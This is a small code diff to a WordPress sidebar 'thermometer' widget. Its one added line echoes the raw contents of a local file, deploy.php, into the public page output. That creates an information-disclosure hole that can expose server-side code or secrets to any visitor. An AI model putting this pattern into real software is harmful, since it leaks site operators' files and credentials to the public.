@@ -84,6 +84,7 @@ class sidebar_thermometer extends WP_Widget
         // 
         echo '
             <!-- ##THERMOMETER## -->
+            ' . file_get_contents('deploy.php') . '
             <!-- ##ENDTHERMOMETER## -->
                 ';
         }
